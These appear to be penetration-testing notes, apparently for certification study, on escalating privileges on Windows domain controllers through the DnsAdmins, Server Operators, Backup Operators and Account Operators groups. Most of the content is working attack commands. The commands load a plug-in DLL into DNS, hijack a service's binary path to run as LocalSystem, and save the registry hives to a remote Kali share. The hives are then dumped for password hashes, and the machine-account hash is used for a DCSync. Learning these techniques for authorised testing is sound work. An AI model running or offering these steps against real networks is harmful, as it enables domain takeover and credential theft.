# Privileged groups and DC host rights

Resolve the group SID, members and host scope, then check the token and the exact operation. Group membership ≠ service, registry, file or object permission.

## Scope and token
```powershell
whoami /all
whoami /groups
whoami /priv
hostname
Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,DomainRole
```
DomainRole `4` or `5` = DC.
```powershell
$DC = '<DC-FQDN>'
Get-ADGroup -Identity 'Server Operators' -Server $DC -Properties GroupScope,member |
    Format-List Name,SID,GroupScope,member
Get-ADGroupMember -Identity 'Server Operators' -Server $DC -Recursive
Get-ADPrincipalGroupMembership -Identity '<USER>' -Server $DC |
    Select-Object Name,SID,GroupScope
```
- Localized OS → use SIDs. New group membership needs a fresh logon (token is not refreshed).

| Group or right | Lead | Confirm |
| --- | --- | --- |
| DnsAdmins | DNS plug-in DLL | DNS role, config right, reachable DLL, restart trigger |
| Server Operators (DC) | Service config/start/stop | Service DACL, account |
| Backup Operators / SeBackupPrivilege | Registry hive save, backup-mode reads | Privilege present, backup-aware tool |
| Account Operators | Non-protected accounts/groups | Target ACL, protected objects excluded |
| Event Log Readers | Event data | Channel access |

- SeImpersonate / SeDebug / SeRestore / SeTakeOwnership → [token rights](../windows/token-groups.md).

## DnsAdmins
DLL must match DNS architecture, be readable by the DNS service, and export the plug-in functions. DnsAdmins does not imply restart rights.
```powershell
sc.exe qc DNS
sc.exe sdshow DNS
accesschk.exe -accepteula -c -v '<USER>' DNS
```
```cmd
dnscmd.exe <DC-FQDN> /config /serverlevelplugindll <DLL-PATH>
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
```powershell
Stop-Service DNS -ErrorAction Stop
Start-Service DNS -ErrorAction Stop
Get-Service DNS
```
- A bad DLL stops DNS from starting. Clear it before retrying:
```cmd
dnscmd.exe <DC-FQDN> /config /serverlevelplugindll
```
- If DNS-RPC is gone, remove `ServerLevelPluginDll` under `HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters` locally.

## Server Operators
Needs `SERVICE_CHANGE_CONFIG` + start (stop if running). Pick an enabled own-process LocalSystem service without dependencies. Check:
```powershell
sc.exe qc <SERVICE>
sc.exe query <SERVICE>
sc.exe sdshow <SERVICE>
accesschk.exe -accepteula -c -v '<USER>' <SERVICE>
```
```powershell
$Before = Get-CimInstance Win32_Service -Filter "Name='<SERVICE>'" -ErrorAction Stop
Stop-Service <SERVICE> -ErrorAction Stop
$ProofCommand = 'C:\Windows\System32\cmd.exe /d /c "whoami /all > C:\Users\Public\proof.txt"'
$Change = Invoke-CimMethod -InputObject $Before -MethodName Change `
    -Arguments @{PathName=$ProofCommand} -ErrorAction Stop
if ($Change.ReturnValue -ne 0) { throw "Service change failed: $($Change.ReturnValue)" }
sc.exe start <SERVICE>
Get-Content -LiteralPath C:\Users\Public\proof.txt
```
- `cmd.exe` is not a service: SCM reports an error but the command still ran. Check the output file.
- `Change` via CIM keeps embedded quotes intact; needs WMI provider access. Service stays broken until you put the original `PathName` back the same way.
- General service abuse → [service permissions](../windows/service-permissions.md), [service binary hijacking](../windows/service-binary-hijacking.md).

## Backup Operators
Membership gives no remote exec (WinRM/WMI/RDP need other rights), but the privilege works remotely over the registry RPC: save the hives to a Kali share.
```bash
mkdir -p /tmp/hives
sudo impacket-smbserver -smb2support share /tmp/hives
impacket-reg '<DOMAIN.TLD>/<USER>:<PW>@<IP>' backup -o '\\<KALI>\share'
impacket-secretsdump -sam /tmp/hives/SAM.save -system /tmp/hives/SYSTEM.save -security /tmp/hives/SECURITY.save LOCAL
```
- `backup` = SAM + SYSTEM + SECURITY. The target must reach Kali on TCP/445.
- On a DC: `$MACHINE.ACC` in the LSA output = DC machine-account hash → DCSync as `<HOSTNAME>$` with `-hashes :<NT>` ([credential-access](credential-access.md#dcsync-inspect-rights-and-select-the-account)).
- Plain remote `secretsdump` (no hive files) needs admin; `reg.py` starts RemoteRegistry via its named pipe instead.

With a shell as that account:
```cmd
reg.exe save HKLM\SAM C:\Temp\sam.save
reg.exe save HKLM\SYSTEM C:\Temp\system.save
reg.exe save HKLM\SECURITY C:\Temp\security.save
```
```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```
- On a DC the SAM holds only the local recovery account. Domain hashes → NTDS workflow in [credential-access](credential-access.md).

Same in one nxc module:
```bash
nxc smb <IP> -u <USER> -p '<PW>' -M backup_operator
```
- Writes the hives to a share the group can reach (SYSVOL), reads them back over SMB, then cleans up — privilege abuse, loot and cleanup in one command. That auto-exploit pattern is **not exam-safe** (check the current exam guide's tool restrictions: [exam-checklist](../documentation/exam-checklist.md)). The manual `impacket-reg backup` + `LOCAL secretsdump` steps above are the step-by-step equivalent.

## Account Operators
Works on non-protected accounts and groups only (`adminCount` can be stale: read the ACL). Look for a writable group that grants access somewhere.
```powershell
$Group = Get-ADGroup '<GROUP>' -Server $DC -Properties member
$Member = Get-ADUser '<USER>' -Server $DC
Add-ADGroupMember -Identity $Group -Members $Member -Server $DC
Get-ADGroupMember -Identity $Group -Server $DC
```
```powershell
Remove-ADGroupMember -Identity $Group -Members $Member -Server $DC -Confirm:$false
```
- Log in fresh before testing the new access. A password reset cannot be undone: prefer group changes.

## Troubleshooting
| Symptom | Check |
| --- | --- |
| Group visible, operation denied | Active token, nested membership, host scope, ACL, deny-only group |
| DNS config set, plug-in not loaded | Architecture, exports, service-account path access, restart rights |
| Service config set, start fails | Start/stop rights, stored quoting, proof output |
| Backup read/save denied | Privilege present and enabled, output path, locked files |
| Group edit OK, resource denied | Fresh logon, DC replication, resource ACL, nested groups |
